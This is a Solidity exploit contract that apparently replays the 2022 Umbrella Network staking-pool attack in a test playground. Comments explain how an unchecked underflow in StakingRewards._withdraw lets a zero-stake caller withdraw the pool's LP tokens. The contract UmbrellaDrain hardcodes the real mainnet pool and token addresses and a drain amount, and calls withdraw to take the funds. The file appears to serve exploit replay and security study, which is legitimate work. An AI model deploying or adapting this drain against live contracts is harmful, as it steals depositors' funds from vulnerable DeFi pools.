// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-03-Umbrella).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (AttackContract is Test; testExploit() calls StakingRewards.withdraw() directly
// with no separate exploit contract), so there is nothing standalone to deploy.
// This contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/Umbrella_exp.sol.

// VULNERABILITY: Unauthorized underflow-enabled withdrawal of staked tokens (no balance check + unchecked arithmetic)
// 
// Root cause in StakingRewards._withdraw (pragma solidity 0.7.5, sources/.../contracts_staking_StakingRewards.sol:258):
//   function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {
//       require(amount != 0, "Cannot withdraw 0");
//       // not using safe math, because there is no way to overflow if stake tokens not overflow
//       _totalSupply = _totalSupply - amount;
//       _balances[user] = _balances[user] - amount;
//       require(stakingToken.transfer(recipient, amount), "token transfer failed");
//       ...
//   }
// 
// - Public withdraw() (line 201) calls _withdraw(amount, msg.sender, msg.sender) with NO check that amount <= _balances[user].
// - _stake() (lines 241-243) only does require(amount != 0) then direct += on _totalSupply/_balances.
// - In Solidity <0.8 (here 0.7.5), uint256 - underflows by wrapping (mod 2^256). No SafeMath.sub used for accounting (contrast SafeERC20 used for token xfers).
// - The transfer uses the *caller-supplied* `amount`, not the post-underflow balance or min(amount, userStake).
// - updateReward modifier (lines 64-71) runs first but for a zero-balance attacker, earned()=0 so no reward side-effect blocks it.
// 
// Why it works: Attacker (zero prior stake) supplies amount == (or <=) contract's current stakingToken.balanceOf(this) (UniLP held from legit stakers).
// Underflow makes _balances[attacker] and _totalSupply wrap to huge values, require(transfer) succeeds because pool actually holds the LP, attacker receives real tokens.
// 
// Impact: Complete drain of the StakingRewards contract's UniLP holdings (user deposits) in a single call, no capital required. ~8792.87 UniLP tokens stolen (~700k USD). Pool accounting left corrupted (huge _totalSupply, huge attacker "balance").
// 
// The incorrect assumption was "users will only ever withdraw what they staked, and stake tokens can't underflow". Missing authorization/balance invariant + deliberate avoidance of SafeMath.

interface IStakingRewards {
    function withdraw(uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract UmbrellaDrain {
    // Vulnerable StakingRewards pool (Umbrella Network reward/staking contract,
    // Ethereum mainnet, solc 0.7.5 — pre-0.8 unchecked arithmetic).
    IStakingRewards constant StakingRewards = IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
    IERC20 constant uniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);

    // The exact amount the historical attacker withdrew: 8,792.873290680252648282
    // UniLP tokens. Withdrawing this (with a zero stake) underflows _totalSupply and
    // _balances[msg.sender], and the pool transfers that many LP tokens here.
    uint256 constant DRAIN_AMOUNT = 8_792_873_290_680_252_648_282;

    function run() external {
        // EXPLOIT STEPS:
        // 1. Deploy UmbrellaDrain (or equivalent attacker-controlled EOA/contract); it has never called stake(), so _balances[drain] == 0 in StakingRewards.
        // 2. Invoke run() which calls StakingRewards.withdraw(DRAIN_AMOUNT) — DRAIN_AMOUNT selected to match the exact LP balance held by the contract at attack time (no need to exceed pool holdings).
        // 3. Inside withdraw -> _withdraw(DRAIN_AMOUNT, msg.sender=drain, recipient=drain):
        //    - require(DRAIN_AMOUNT != 0) passes.
        //    - updateReward(drain) computes earned() using current (zero) _balances[drain] → reward=0, no mint.
        //    - _totalSupply = _totalSupply - DRAIN_AMOUNT  (underflow wrap because solc 0.7.5, no SafeMath).
        //    - _balances[drain] = 0 - DRAIN_AMOUNT  (underflow wrap to 2^256 - DRAIN_AMOUNT).
        //    - stakingToken.transfer(drain, DRAIN_AMOUNT) — the require passes because the contract's actual ERC20 balance of UniLP >= DRAIN_AMOUNT.
        // 4. LP tokens are now in attacker's possession. Attacker can later remove liquidity on the UniLP Uniswap pair.
        // 5. Contract state is left inconsistent (inflated totalSupply and bogus user balance), but the value has already left.
        //
        // No deposit, no flashloan, no reentrancy — pure missing check + arithmetic semantics exploit.
        StakingRewards.withdraw(DRAIN_AMOUNT);
    }
}
